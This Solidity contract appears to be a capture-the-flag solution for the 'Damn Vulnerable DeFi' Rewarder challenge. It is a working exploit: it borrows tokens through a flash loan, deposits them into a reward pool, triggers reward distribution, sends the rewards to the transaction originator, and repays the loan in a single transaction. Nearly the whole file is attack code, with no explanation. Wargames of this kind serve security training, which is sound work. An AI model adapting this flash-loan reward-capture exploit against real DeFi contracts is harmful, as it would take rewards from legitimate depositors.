// SPDX-License-Identifier: MIT

pragma solidity ^0.8.0;
import "@openzeppelin/contracts/token/ERC20/ERC20.sol";
import "hardhat/console.sol";


interface IDamnValuableToken {
    function approve(address spender, uint256 amount) external returns (bool);
    function transfer(address recipient, uint256 amount) external returns (bool);
}

interface ITheRewarderPool {
    function deposit(uint256 amount) external;
    function withdraw(uint256 amount) external;
    function distributeRewards() external returns (uint256);
}


interface IFlashLoanerPool {
    function flashLoan(uint256 amount) external;
}

contract TheRewarderExploit {
    ITheRewarderPool reward_pool;
    IFlashLoanerPool pool;
    ERC20 reward_token;
    IDamnValuableToken dvt;
    uint total;
    constructor(uint _total, address _reward, address _pool, address _token, address _dvt) {
        total = _total;
        reward_pool = ITheRewarderPool(_reward);
        pool = IFlashLoanerPool(_pool);
        reward_token = ERC20(_token);
        dvt = IDamnValuableToken(_dvt);
    }

    function _balance() public view returns(uint256, uint256){
        return (total, address(reward_pool).balance);
    }

    function exploit() public {
        pool.flashLoan(total);
    }
    
    function test() public returns(uint256){
        uint256 _test = reward_pool.distributeRewards();
        return _test;
    }
    function receiveFlashLoan(uint256 amount) public {
        dvt.approve(address(reward_pool), amount);
        reward_pool.deposit(amount);
        uint256 reward_amount = reward_pool.distributeRewards();
        // console.log("reward amount", reward_amount);
        reward_token.transfer(tx.origin, reward_amount);
        reward_pool.withdraw(amount);
        dvt.transfer(address(pool), amount);
    }

    receive() external payable{}
}

